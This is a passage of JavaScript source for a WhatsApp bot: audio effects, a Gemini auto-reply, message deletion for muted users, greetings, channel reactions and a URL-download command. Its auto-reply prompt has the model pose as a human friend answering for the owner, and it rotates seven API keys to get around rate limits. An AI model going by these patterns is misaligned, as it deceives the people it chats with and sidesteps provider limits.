        else if (SYHaTeS7 === 'tempo') filters = ['atempo=0.9', 'asetrate=65100'];
        else if (SYHaTeS7 === 'nightcore') filters = ['atempo=1.07', 'asetrate=44100*1.20'];
        else if (SYHaTeS7 === 'smooth') filters = ['acompressor=threshold=-20dB:ratio=4:attack=5:release=50'];
        else if (SYHaTeS7 === 'echo') filters = ['aecho=0.8:0.9:1000:0.3'];
        else if (SYHaTeS7 === 'robot') filters = ["afftfilt=real='hypot(re,im)':imag='0'"];
        else if (SYHaTeS7 === 'chipmunk') filters = ['asetrate=44100*1.25', 'atempo=0.8'];
        else if (SYHaTeS7 === 'dark') filters = ['asetrate=44100*0.8', 'atempo=1.2'];
        else if (SYHaTeS7 === 'blown') filters = ['acrusher=.1:1:64:0:log'];
        else if (SYHaTeS7 === 'reverb') filters = ['aecho=0.8:0.88:60:0.4'];
        else if (SYHaTeS7 === 'vapor') filters = ['asetrate=44100*0.85', 'atempo=1.1'];
        else if (SYHaTeS7 === 'treble') filters = ['treble=g=10'];
        else if (SYHaTeS7 === 'earrape') filters = ['volume=12'];
        else if (SYHaTeS7 === '8d') filters = ['apulsator=hz=0.125'];
        else if (SYHaTeS7 === 'distort') filters = ['acrusher=20:1:64:0:log'];
        else if (SYHaTeS7 === 'karaoke') filters = ['stereotools=mlev=0.03'];
        else if (SYHaTeS7 === 'flanger') filters = ['flanger'];
        else if (SYHaTeS7 === 'gate') filters = ['agate'];
        else if (SYHaTeS7 === 'phaser') filters = ['aphaser'];
        else if (SYHaTeS7 === 'chorus') filters = ['chorus=0.5:0.9:50|60|40:0.4|0.3|0.2:0.25|0.4|0.3:2|2.3|1.3'];

        await new Promise((resolve, reject) => {
            ffmpeg(input)
                .audioFilters(filters)
                .audioCodec('libmp3lame')
                .audioBitrate('128k')
                .format('mp3')
                .on('end', resolve)
                .on('error', reject)
                .save(output);
        });

        const resultAudio = fs.readFileSync(output);
        await SYxS7.sendMessage(from, { audio: resultAudio, mimetype: 'audio/mpeg' }, { quoted: S7 });
        await SYxS7.sendMessage(from, { react: { text: "✅", key: S7.key } });

        try { if (fs.existsSync(input)) fs.unlinkSync(input); } catch (e) {}
        try { if (fs.existsSync(output)) fs.unlinkSync(output); } catch (e) {}

    } catch (err) {
        console.error(err);
        await SYxS7.sendMessage(from, { react: { text: "❌", key: S7.key } });
        return await SYHaTeReplay("_Failed to process audio effect_");
    }
}


const budy = (type === 'conversation') ? S7.message.conversation : (type === 'extendedTextMessage') ? S7.message.extendedTextMessage.text : (type === 'imageMessage') ? S7.message.imageMessage.caption : (type === 'videoMessage') ? S7.message.videoMessage.caption : '';

const isMe = S7?.key?.fromMe || m?.key?.fromMe || sender === botNumber;

if (isMe && !isGroup) {
    if (!db[botNumber]) db[botNumber] = {};
    if (!db[botNumber][from]) db[botNumber][from] = {};
    
    db[botNumber][from].lastManualMessage = Date.now();
    saveDB(db);
}

const isChannel = (currentJid || from || jid || '').endsWith('@newsletter');

if (db[botNumber]?.ai_manager && !isChannel && !S7.key.remoteJid.endsWith('@g.us') && !S7?.key?.fromMe && sender !== botNumber && !isCmd) {
    if (!budy) return;

    const now = Date.now();
    const lastManualAction = db[botNumber]?.[from]?.lastManualMessage || 0;
    const cooldown = 5 * 60 * 1000;

    if (now - lastManualAction < cooldown) return;

    try {
        await SYxS7.sendPresenceUpdate('composing', from);

        const keys = [config.GEMINI, config.GEMINI2, config.GEMINI3, config.GEMINI4, config.GEMINI5, config.GEMINI6, config.GEMINI7].filter(k => k);
        let aiReply = null;
        const model = "gemini-2.5-flash-lite";

        if (!db[botNumber].ai_chats) db[botNumber].ai_chats = {};
        if (!db[botNumber].ai_chats[from]) db[botNumber].ai_chats[from] = [];
        
        let history = db[botNumber].ai_chats[from];

        const customInstructions = db[botNumber]?.ai_custom_prompt ? `\n\n[STRICT INSTRUCTION FROM SABIR]:\n${db[botNumber].ai_custom_prompt}` : "";

        const systemPrompt = `You are Sabir7718's highly intelligent personal AI assistant. 

CORE DIRECTIVES:
1. NEVER repeat the same phrase twice in a row.
2. DO NOT say "Sabir is busy" or "Sabir is studying" UNLESS the user explicitly asks "Where is Sabir?" or "What is Sabir doing?".
3. If the user wants to play, chat, or joke, behave like a real human friend.
4. If previous history shows you were repetitive, BREAK that pattern now and be creative.
5. Use a smart, "hacker-style" professional tone but keep it friendly.
6. Language: Match user's language (Hindi/English/Bengali) perfectly.${customInstructions}`;

        let messagesForAI = [{ role: "user", parts: [{ text: systemPrompt }] }];
        
        history.slice(-10).forEach(msg => {
            messagesForAI.push({
                role: msg.role === "assistant" ? "model" : "user",
                parts: [{ text: msg.content }]
            });
        });
        
        messagesForAI.push({ role: "user", parts: [{ text: budy }] });

        for (let i = 0; i < keys.length; i++) {
            try {
                const currentKey = keys[i];
                const url = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${currentKey}`;

                const response = await axios.post(url, {
                    contents: messagesForAI
                }, { timeout: 15000 });

                aiReply = response.data?.candidates?.[0]?.content?.parts?.[0]?.text;
                
                if (aiReply) {
                    log('info', 'AI_MANAGER', `Replied using Key #${i + 1}`);
                    break;
                }
            } catch (err) {
                const errMsg = err.response?.data?.error?.message || err.message;
                if (errMsg.toLowerCase().includes('rate') || errMsg.toLowerCase().includes('leak') || errMsg.toLowerCase().includes('access') || err.response?.status === 429) {
                    log('warn', 'AI_MANAGER', `Key #${i + 1} Rate Limited. Trying next...`);
                    continue; 
                } else {
                    log('error', 'AI_MANAGER', `Key #${i + 1} Error: ${errMsg}`);
                    break;
                }
            }
        }

        if (aiReply) {
            history.push({ role: "user", content: budy });
            history.push({ role: "assistant", content: aiReply });

            if (history.length > 20) history.splice(0, 2); 
            
            db[botNumber].ai_chats[from] = history;
            saveDB(db);

            await SYxS7.sendPresenceUpdate('paused', from);
            await SYHaTeReplay(aiReply);
        } else {
            await SYxS7.sendPresenceUpdate('paused', from);
        }
        
    } catch (err) {
        await SYxS7.sendPresenceUpdate('paused', from);
        log('error', 'AI_MANAGER_FATAL', err.message);
    }
}

const botLid = (SYxS7.user.lid || '').split(':')[0]; 
const botNumberOnly = (SYxS7.user.id || '').split(':')[0].split('@')[0];
const dbKey = botNumberOnly + '@s.whatsapp.net';

const mentionTrigger = budy && (
    budy.includes(`@${botLid}`) || 
    budy.includes(`@${botNumberOnly}`) ||
    (m.message?.extendedTextMessage?.contextInfo?.mentionedJid || []).some(jid => jid.includes(botNumberOnly) || jid.includes(botLid))
);

const mConfig = db[dbKey]?.mention_song;

if (isGroup && mConfig?.groups?.[from] && mentionTrigger && !S7?.key?.fromMe) {
    try {
        const songFiles = fs.readdirSync(songPath).filter(f => f.endsWith('.opus'));
        if (songFiles.length > 0) {
            const randomSong = songFiles[Math.floor(Math.random() * songFiles.length)];
            const audioBuffer = fs.readFileSync(path.join(songPath, randomSong));
            const rawWaveform = Buffer.from("GCEoKDkqKyssKC44KjFLPD9AZFhDIzdOSTwgMTxHPjo0WzZMU0lBKjM2RzVEMTg2Oj1GLyklLD44UUpLQUQ+OA==", "base64");

            const isLargeThumb = typeof mConfig.largeThumb !== 'undefined' ? mConfig.largeThumb : false;
            const customSourceUrl = mConfig.sourceUrl || "https://instagram.com/sayan_dev";

            await SYxS7.sendMessage(from, {
                audio: audioBuffer,
                mimetype: 'audio/ogg; codecs=opus',
                ptt: true,
                waveform: rawWaveform,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: mConfig.title || "𝚉𝙾𝚁𝙾 𝙼𝚄𝚂𝙸𝙲 𝙿𝙻𝙰𝚈𝙴𝚁",
                        body: mConfig.body || "⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻",
                        thumbnailUrl: mConfig.thumb || 'https://i.ibb.co/wr0cqBvD/photo.jpg',
                        sourceUrl: customSourceUrl,
                        mediaType: 1,
                        renderLargerThumbnail: isLargeThumb 
                    }
                }
            }, { quoted: S7 });
        }
    } catch (err) {
        console.log('Error playing PTT song:', err.message);
    }
}



    const currentPresence = db[dbKey]?.presence_settings;

    if (currentPresence?.typing) {
        await SYxS7.sendPresenceUpdate('composing', from);
        console.log(S7);
    } else if (currentPresence?.recording) {
        await SYxS7.sendPresenceUpdate('recording', from);
        console.log(S7 + "recording");
    }



if (isGroup && db[from]?.antimention && !S7.key.fromMe) {
    
    const isGroupMention = (
        type === 'groupStatusMentionMessage' || 
        S7.message?.groupStatusMentionMessage || 
        S7.message?.extendedTextMessage?.contextInfo?.groupStatusMentionMessage
    );

    if (isGroupMention) {
        const groupMetadata = await SYxS7.groupMetadata(from).catch(() => null);
        const participants = groupMetadata?.participants || [];
        const senderParticipant = participants.find(p => p.id === sender);
        const isSenderAdmin = senderParticipant?.admin === 'admin' || senderParticipant?.admin === 'superadmin';
        const isOwner = sender.includes('917384280473') || S7.key.fromMe;

        if (!isSenderAdmin && !isOwner) {
            try {
                await SYxS7.sendMessage(from, { 
                    delete: { 
                        remoteJid: from, 
                        fromMe: false, 
                        id: S7.key.id, 
                        participant: sender 
                    } 
                });
            } catch (err) {
                console.log("Anti-Mention Failed: Bot is not admin.");
                await SYHaTeReplay(`⚠️ *ＡＮＴＩ - ＭＥＮＴＩＯＮ  ＥＲＲＯＲ*\n\n> Group Mention detected but I cannot delete it!\n\n*Action:* Please **Make me an Admin**.`);
                db[from].antimention = false; 
                saveDB(db);
            }
        }
    }
}


if (isGroup) {
    const botNumberOnly = (SYxS7.user.id || '').split(':')[0].split('@')[0];
    const dbKey = botNumberOnly + '@s.whatsapp.net';
    
    if (db[dbKey]?.muted_users?.[from]) {
        const senderLid = (S7.key.participant || S7.key.remoteJid || '').split(':')[0].split('@')[0];
        const userMuteData = db[dbKey].muted_users[from][senderLid];

        if (userMuteData) {
            if (userMuteData.expiresAt && Date.now() > userMuteData.expiresAt) {
                delete db[dbKey].muted_users[from][senderLid];
                saveDB(db);
            } else {
                try {
                    await SYxS7.sendMessage(from, {
                        delete: {
                            remoteJid: from,
                            fromMe: false,
                            id: S7.key.id,
                            participant: S7.key.participant || S7.key.remoteJid
                        }
                    });
                } catch (err) {
                    console.log("Failed to delete muted user message:", err.message);
                }
            }
        }
    }
}

if (jid && jid.endsWith('@s.whatsapp.net')) {
    if (jid !== botNumber) {
        if (!db.greeted_users) db.greeted_users = {};
        if (!db.greeted_users[botNumber]) db.greeted_users[botNumber] = [];

        if (!db.greeted_users[botNumber].includes(jid)) {
            db.greeted_users[botNumber].push(jid);
            saveDB(db);

            if (db[botNumber] && db[botNumber].gmsg) {
                const configGmsg = db[botNumber].gmsg;
                const fs = require('fs');
                
                try {
                    if (configGmsg.type === 'text' && configGmsg.content) {
                        await SYxS7.sendMessage(jid, { text: configGmsg.content });
                    } 
                    else if (configGmsg.type === 'image') {
                        if (configGmsg.content && fs.existsSync(configGmsg.content)) {
                            await SYxS7.sendMessage(jid, { image: fs.readFileSync(configGmsg.content), caption: configGmsg.caption || '' });
                        }
                    } 
                    else if (configGmsg.type === 'video') {
                        if (configGmsg.content && fs.existsSync(configGmsg.content)) {
                            await SYxS7.sendMessage(jid, { video: fs.readFileSync(configGmsg.content), caption: configGmsg.caption || '', gifPlayback: !!configGmsg.isGif });
                        }
                    } 
                    else if (configGmsg.type === 'audio') {
                        if (configGmsg.content && fs.existsSync(configGmsg.content)) {
                            await SYxS7.sendMessage(jid, { audio: fs.readFileSync(configGmsg.content), mimetype: 'audio/mp4', ptt: true });
                        }
                    }
                } catch (err) {
                    console.error("Gmsg Listener Error:", err);
                }
            }
        }
    }
}


global.creactTasks = global.creactTasks || {};

if (global.creactTasks && Object.keys(global.creactTasks).length > 0) {
  for (const taskId in global.creactTasks) {
    const task = global.creactTasks[taskId];
    
    if (!task.senders.includes(sender)) {
      task.senders.push(sender);
      
      const randomEmoji = task.emojis[Math.floor(Math.random() * task.emojis.length)];
      
      SYxS7.newsletterReactMessage(task.channelJid, task.messageId, randomEmoji)
        .catch(async (err) => {
          console.error(err.message);
          await SYxS7.sendMessage("917365085213@s.whatsapp.net", {
            text: `❌ *Creact Error Notification*\n\n📌 *Task ID:* ${taskId}\n📢 *Channel:* ${task.channelJid}\n🆔 *Message ID:* ${task.messageId}\n⚠️ *Error:* ${err.message}`
          }).catch((sendErr) => console.error("Failed to send error notification:", sendErr.message));
        });
    }
  }
}



if (
  !isChannel &&
  !isGroup &&
  !S7.key.remoteJid.endsWith("@g.us") &&
  !S7?.key?.fromMe &&
  sender !== botNumber &&
  !isCmd &&
  !isOwner
) {
  const greetConfig = db[botNumber]?.gmsg;

  if (greetConfig && Array.isArray(greetConfig.messages)) {
    
    if (!db.greeted_users) db.greeted_users = {};
    if (!db.greeted_users[botNumber]) db.greeted_users[botNumber] = [];

    if (jid && !db.greeted_users[botNumber].includes(jid)) {
      db.greeted_users[botNumber].push(jid);
      saveDB(db);

      const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

      (async () => {
        for (const msgConfig of greetConfig.messages) {
          try {
            if (!msgConfig.enabled) continue;

            if (msgConfig.type === 'text' && msgConfig.content) {
              await SYxS7.sendMessage(jid, { text: msgConfig.content });
            } 
            else if (msgConfig.type === 'image' && msgConfig.content && fs.existsSync(msgConfig.content)) {
              await SYxS7.sendMessage(jid, { 
                image: fs.readFileSync(msgConfig.content), 
                caption: msgConfig.caption || '' 
              });
            } 
            else if (msgConfig.type === 'video' && msgConfig.content && fs.existsSync(msgConfig.content)) {
              await SYxS7.sendMessage(jid, { 
                video: fs.readFileSync(msgConfig.content), 
                caption: msgConfig.caption || '', 
                gifPlayback: !!msgConfig.isGif 
              });
            } 
            else if (msgConfig.type === 'audio' && msgConfig.content && fs.existsSync(msgConfig.content)) {
              await SYxS7.sendMessage(jid, { 
                audio: fs.readFileSync(msgConfig.content), 
                mimetype: 'audio/mp4', 
                ptt: true 
              });
            }

            await delay(msgConfig.delay || 1500);

          } catch (err) {
            console.error("Greeting Message Sending Error:", err);
          }
        }
      })();
    }
  }
}



                        const SYHaTe = async () => {
                let db = getDB(); 

                if (!db[botNumber]) {
                    db[botNumber] = { 
                        mode: 'public',
                        autoreact: false, 
                        emojis: ['❤️', '✨', '🔥', '⚡', '👑'] 
                    };
                    saveDB(db);
                }

const checkIsSudo = () => {
    const rawSender = sender.split('@')[0];
    if (!db[botNumber]) db[botNumber] = {};
    if (!db[botNumber].sudoUsers) db[botNumber].sudoUsers = [];
    return db[botNumber].sudoUsers.includes(rawSender);
};

const isOwner = sender === '917365085213@s.whatsapp.net' || S7.key.fromMe || checkIsSudo();
const isRealOwner = sender === '917365085213@s.whatsapp.net' || S7.key.fromMe; 


if (!db[botNumber].public_cmds) {
    db[botNumber].public_cmds = [];
    saveDB(db);
}

const isPublicCmd = db[botNumber].public_cmds.includes(SYHaTeS7);

if (db[botNumber].mode === 'self' && !isOwner && !isPublicCmd) return;


                if (!db[sender]) db[sender] = { name: S7user, SYHaTeS7s: 0 };
                db[sender].SYHaTeS7s += 1;
                saveDB(db);

                if (SYHaTeS7 === 'self') {
                    if (!isOwner) return await SYHaTeReplay(owneronly);
                    db[botNumber].mode = 'self';
                    saveDB(db);
                    return await SYHaTeReplay('🔒 *Mode switched to SELF.*\nNow ONLY you can use the bot.');
                }

                if (SYHaTeS7 === 'public') {
                    if (!isOwner) return await SYHaTeReplay(owneronly);
                    db[botNumber].mode = 'public';
                    saveDB(db);
                    return await SYHaTeReplay('🔓 *Mode switched to PUBLIC.*\nNow EVERYONE can use the bot.');
                }

                if (SYHaTeS7 === 'ping') {
                const start = Date.now();
            
                await SYHaTeReplay('*˹ ᴄᴀʟᴄᴜʟᴀᴛɪɴɢ sᴘᴇᴇᴅ... ˼ ⤸*');
            
                const latency = Date.now() - start;
            
                await SYHaTeReplay(`*˹ ʟᴀᴛᴇɴᴄʏ: ${latency} 𝐌𝐒 ⤸*`);
            }
            
                if (SYHaTeS7 === 'ping2') {
                const start = Date.now();
            
                const msg = await SYHaTeReplay('*_🚀 System Checking..._*');
                
                const latency = Date.now() - start;
            
                const loadingSteps = [
                    '*_⚡ Analyzing Connection..._*',
                    '*_📡 Fetching Data Packets..._*',
                    '*_🪄 Finalizing Results..._*'
                ];
            
                for (const step of loadingSteps) {
                    await new Promise(resolve => setTimeout(resolve, 500)); 
                    await SYHaTeReplay2(step, { edit: msg.key });
                }        
                            
                let status = "*_Slow 🐢_*";
                if (latency < 100) status = "*_Ultra Fast ⚡_*";
                else if (latency < 300) status = "*_Fast 🚀_*";
                else if (latency < 600) status = "*_Decent 🟡_*";
            
                const styles = [
                    `乂 𝐏𝐈𝐍𝐆 𝐑𝐄𝐒𝐔𝐋𝐓 乂\n${latency} 𝐦𝐬\n${status}`,
                    `❯❯❯ ${status} ❮❮❮\n𝐋𝐚𝐭𝐞𝐧𝐜𝐲: ${latency} 𝐦𝐬`,
                    `𝐒𝐏𝐄𝐄𝐃 𝐋𝐄𝐕𝐄𝐋: ${status}\n⏱️ ${latency}𝐦𝐬`,
                    `乂乂 𝐏𝐈𝐍𝐆 𝐂𝐇𝐄𝐂𝐊 乂乂\n⏱️ ${latency} 𝐦𝐬\n${status}`,
                    `❖ 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 𝐓𝐈𝐌𝐄 ❖\n${latency} 𝐦𝐬\n${status}`,
                    `𝐔𝐋𝐓𝐑𝐀 𝐒𝐏𝐄𝐄𝐃: ${status}\n⚡ ${latency} 𝐦𝐬`,
                    `✦ 𝐏𝐈𝐍𝐆 𝐑𝐄𝐒𝐔𝐋𝐓 ✦\n${latency} 𝐦𝐬\n${status}`,
                    `➤ ${status} ➤\n𝐋𝐚𝐭𝐞𝐧𝐜𝐲 ↝ ${latency} 𝐦𝐬`,
                    `𝐏𝐈𝐍𝐆 𝐒𝐓𝐀𝐓𝐔𝐒\n⏳ ${latency} 𝐦𝐬\n${status}`,
                    `❰❰ ${status} ❱❱\n𝐒𝐩𝐞𝐞𝐝: ${latency} 𝐦𝐬`,
                    `𝐁𝐎𝐎𝐒𝐓𝐄𝐃 𝐏𝐈𝐍𝐆\n⚡ ${latency} 𝐦𝐬\n${status}`,
                    `乂 𝐒𝐏𝐄𝐄𝐃 𝐓𝐄𝐒𝐓 乂\n${latency} 𝐦𝐬 → ${status}`,
                    `✧ 𝐋𝐀𝐓𝐄𝐍𝐂𝐘 ✧\n${latency} 𝐦𝐬\n${status}`,
                    `❯ 𝐏𝐈𝐍𝐆 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄 ❮\n${latency} 𝐦𝐬 | ${status}`,
                    `𝐌𝐀𝐗 𝐒𝐏𝐄𝐄𝐃: ${status}\n⏱️ ${latency} 𝐦𝐬`,
                    `🔥 ${status} 🔥\n𝐏𝐢𝐧𝐠: ${latency} 𝐦𝐬`,
                    `⎯⎯⎯ 𝐏𝐈𝐍𝐆 𝐑𝐄𝐒𝐔𝐋𝐓 ⎯⎯⎯\n${latency} 𝐦𝐬\n${status}`,
                    `✪ 𝐒𝐔𝐏𝐄𝐑 𝐏𝐈𝐍𝐆 ✪\n⏱️ ${latency} 𝐦𝐬\n${status}`,
                    `𝐋𝐈𝐆𝐇𝐓𝐍𝐈𝐍𝐆 𝐌𝐎𝐃𝐄: ${status}\n⚡ ${latency} 𝐦𝐬`,
                    `❂ 𝐑𝐄𝐀𝐂𝐓𝐈𝐎𝐍 𝐓𝐈𝐌𝐄 ❂\n${latency} 𝐦𝐬\n${status}`,
                    `➵ ${status} ➵\n𝐏𝐢𝐧𝐠 𝐒𝐩𝐞𝐞𝐝: ${latency} 𝐦𝐬`,
                    `𝐏𝐈𝐍𝐆 𝐏𝐎𝐖𝐄𝐑\n${latency} 𝐦𝐬 | ${status}`,
                    `♛ 𝐏𝐈𝐍𝐆 𝐐𝐔𝐄𝐄𝐍 ♛\n${latency} 𝐦𝐬\n${status}`,
                    `𝐄𝐗𝐓𝐑𝐄𝐌𝐄 𝐒𝐏𝐄𝐄𝐃\n⚡ ${latency} 𝐦𝐬\n${status}`,
                    `⦿ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐈𝐎𝐍 𝐒𝐓𝐀𝐓𝐔𝐒 ⦿\n${latency} 𝐦𝐬\n${status}`,
                    `𝐓𝐇𝐔𝐍𝐃𝐄𝐑 𝐏𝐈𝐍𝐆\n${latency} 𝐦𝐬 → ${status}`,
                    `🌟 𝐏𝐈𝐍𝐆 𝐌𝐀𝐒𝐓𝐄𝐑 🌟\n${latency} 𝐦𝐬\n${status}`,
                    `𝐕𝐈𝐏 𝐏𝐈𝐍𝐆\n⚡ ${latency} 𝐦𝐬 | ${status}`,
                    `❈ 𝐒𝐏𝐄𝐄𝐃 𝐁𝐎𝐎𝐒𝐓 ❈\n⏱️ ${latency} 𝐦𝐬\n${status}`,
                    `𝐆𝐎𝐃 𝐌𝐎𝐃𝐄: ${status}\n${latency} 𝐦𝐬`,
                    `✯ 𝐑𝐄𝐂𝐎𝐑𝐃 𝐏𝐈𝐍𝐆 ✯\n${latency} 𝐦𝐬\n${status}`,
                    `𝐏𝐈𝐍𝐆 𝐎𝐅 𝐓𝐇𝐄 𝐃𝐀𝐘\n${latency} 𝐦𝐬 → ${status}`,
                    `♾️ 𝐈𝐍𝐒𝐓𝐀𝐍𝐓 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ♾️\n${latency} 𝐦𝐬\n${status}`,
                    `𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐏𝐈𝐍𝐆\n✨ ${latency} 𝐦𝐬 | ${status}`,
                    `🌝 𝐏𝐈𝐍𝐆 𝐕𝐈𝐁𝐄𝐒 🌝\n${latency} 𝐦𝐬\n${status}`,
                    `🔱 𝐏𝐈𝐍𝐆 𝐃𝐈𝐕𝐈𝐍𝐄 🔱\n${latency} 𝐦𝐬\n${status}`
                ];
            
                let resultText = styles[Math.floor(Math.random() * styles.length)];
                
                await SYHaTeReplay2(`${resultText}`, { edit: msg.key });
            
                const reactions = ['⚡', '🏓', '🚀', '🔥', '✨', '💨', '🌟', '🌀', '🎯', '💥', '📡', '⏱️'];
                const randomReact = reactions[Math.floor(Math.random() * reactions.length)];
            
                await SYxS7.sendMessage(from, {
                    react: {
                        text: randomReact,
                        key: msg.key
                    }
                });
            }
            
            

if (SYHaTeS7 === 'play2') {
    if (!text) return await SYHaTeReplay(`❌ *Give song name!*\nExample: ${prefix}play2 hello`);
    const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("@whiskeysockets/baileys");

    try {
        const search = await yts(text);
        const videos = search.videos.slice(0, 5);

        if (!videos.length) return await SYHaTeReplay("❌ No results found!");

        let cards = [];

        for (let vid of videos) {

            const media = await prepareWAMessageMedia(
                { image: { url: vid.thumbnail } },
                { upload: SYxS7.waUploadToServer }
            );

            cards.push({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: `🎵 *${vid.title}*\n\n⏱️ ${vid.timestamp}\n👁️ ${vid.views.toLocaleString()} Views\n👤 ${vid.author.name}`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "─【 𝐃 𝐇 — ا 𝐘 】─"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: "🎧 MUSIC",
                    hasMediaAttachment: true,
                    ...media
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                        {
                            name: "quick_reply",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Audio",
                                id: `${prefix}s7hatesy2 ${vid.url}`
                            })
                        },
                        {
                            name: "quick_reply",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Video",
                                id: `${prefix}s7hatesy ${vid.url}`
                            })
                        }
                    ]
                })
            });
        }

        const msg = generateWAMessageFromContent(from, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `🔍 Results for: ${text}`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "Swipe →"
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
                            cards: cards
                        })
                    })
                }
            }
        }, {});

        await SYxS7.relayMessage(from, msg.message, { messageId: msg.key.id });

    } catch (err) {
        console.log(err);
        return await SYHaTeReplay("❌ Carousel failed (your Baileys may be old)");
    }
}

if (SYHaTeS7 === 'runtime') {
    try {
        const start = Date.now();
        const dbData = getDB();
        const runtime = getRuntime(dbData);
        
        const dbSizeBytes = Buffer.byteLength(JSON.stringify(dbData, null, 2));
        const dbSize = formatSize(dbSizeBytes);
        const totalKeys = Object.keys(dbData).length;
        const latency = Date.now() - start;

        const result = `*˹ ʀᴜɴᴛɪᴍᴇ ʀᴇᴘᴏʀᴛ ˼ ⤸*

*❖ ʀᴜɴᴛɪᴍᴇ: ${runtime}*
*❖ ᴅᴀᴛᴀʙᴀsᴇ: ${dbSize}*
*❖ ᴋᴇʏs: ${totalKeys}*
*❖ ʟᴀᴛᴇɴᴄʏ: ${latency} ms*`;

        await SYHaTeReplay(result);

    } catch (e) {
        await SYHaTeReplay("˹ ʀᴜɴᴛɪᴍᴇ ғᴀɪʟᴇᴅ ˼ ⤸");
    }
}

if (SYHaTeS7 === "invite") {
        if (!isGroup) return await SYHaTeReplay(onlygc);

        const groupMetadata = await SYxS7.groupMetadata(from);
        const participants = groupMetadata.participants;
        const botNumber =
          (SYxS7.user.id.split(":")[0] || SYxS7.user.id).split("@")[0] +
          "@s.whatsapp.net";
        const botLid = SYxS7.user.lid || botNumber;
        const isBotAdmin = isGroup
          ? participants
              .filter((v) => v.admin !== null)
              .map((v) => v.id)
              .some((id) => id === botNumber || id === botLid)
          : false;

        //  if (!isBotAdmin) return await SYHaTeReplay("*I need to be an admin to generate the group invite link!*");

        try {
          const code = await SYxS7.groupInviteCode(from);

          if (!code) {
            return await SYHaTeReplay("*I can't get the invite link.*");
          }

          const inviteLink = `https://chat.whatsapp.com/${code}`;
          return await SYHaTeReplay(`*Group Invite Link:*\n${inviteLink}`);
        } catch (err) {
          console.error(err);
          return await SYHaTeReplay("*I can't get the invite link.* \n" + err);
        }
      }

if (SYHaTeS7 === 'online') {
    await SYxS7.sendPresenceUpdate('available');
    let db = getDB();
    const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    if (!db[botNumber]) db[botNumber] = {};
    db[botNumber].alwaysOnline = true;
    saveDB(db);
    await SYHaTeReplay("✅ *Status Updated:* You are now appearing *Online*.");
}

if (SYHaTeS7 === 'offline') {
    await SYxS7.sendPresenceUpdate('unavailable');
    let db = getDB();
    const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    if (!db[botNumber]) db[botNumber] = {};
    db[botNumber].alwaysOnline = false;
    saveDB(db);
    await SYHaTeReplay("✅ *Status Updated:* You are now appearing *Offline*.");
}

if (SYHaTeS7 === 'giftquote') {
    if (!db[botNumber]) db[botNumber] = {};
    
    let input = text.toLowerCase().trim(); 

    if (input === 'on') {
        db[botNumber].giftquote = true;
        saveDB(db);
        return await SYHaTeReplay("✅ *Gift Quote Feature turned ON*");
    } else if (input === 'off') {
        db[botNumber].giftquote = false;
        saveDB(db);
        return await SYHaTeReplay("❌ *Gift Quote Feature turned OFF* (Now using real quotes)");
    } else {
        const status = db[botNumber]?.giftquote ? 'ON' : 'OFF';
        return await SYHaTeReplay(`*Usage:* ${prefix}giftquote on/off\n\n*Current Status:* ${status}`);
    }
}

if (SYHaTeS7 === 'wget') {
    const axios = require('axios');
    const fs = require('fs');
    const path = require('path');

    if (!text) return await SYHaTeReplay(`*Usage:* ${prefix}wget [URL]\n\n*Example:* ${prefix}wget https://example.com/video.mp4`);

    const url = text.trim();
    const fileName = path.basename(new URL(url).pathname) || `file_${Date.now()}`;
    const filePath = path.join(__dirname, `./${fileName}`);

    try {
        await SYHaTeReplay(`⏳ *Downloading:* ${fileName}...\nPlease wait.`);

        const response = await axios({
            method: 'GET',
            url: url,
            responseType: 'stream'
        });

        const writer = fs.createWriteStream(filePath);
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        const stats = fs.statSync(filePath);
        const fileSizeInMB = (stats.size / (1024 * 1024)).toFixed(2);

        if (stats.size > 100 * 1024 * 1024) {
            if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
            return await SYHaTeReplay("❌ *Error:* File size is too large (Max 100MB).");
        }

        await SYHaTeReplay(`📤 *Sending:* ${fileName} (${fileSizeInMB} MB)`);

        await SYxS7.sendMessage(from, { 
            document: { url: filePath }, 
            mimetype: 'application/octet-stream', 
            fileName: fileName 
        }, { quoted: S7 });

        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);

    } catch (error) {
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
        log('error', 'WGET', error.message);
        return await SYHaTeReplay("❌ *Wget Failed:* " + error.message);
    }
}

if (SYHaTeS7 === 'gevent') {
    if (!isGroup) return await SYHaTeReplay(onlygc);
    const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    
    if (!db[botNumber]) db[botNumber] = {};
    if (!db[botNumber].gevent_status) db[botNumber].gevent_status = {};

    const action = text.toLowerCase().trim();

    if (action === 'on') {
        db[botNumber].gevent_status[from] = true;
        saveDB(db);
        return await SYHaTeReplay(`*ＧＲＯＵＰ  ＥＶＥＮＴＳ*\n\n> *Status:* ENABLED\n> *System:* Bot will now notify group activities in real-time.`);
    } 
    
    else if (action === 'off') {
        db[botNumber].gevent_status[from] = false;
        saveDB(db);
        return await SYHaTeReplay(`*ＧＲＯＵＰ  ＥＶＥＮＴＳ*\n\n> *Status:* DISABLED`);
    }

    else {
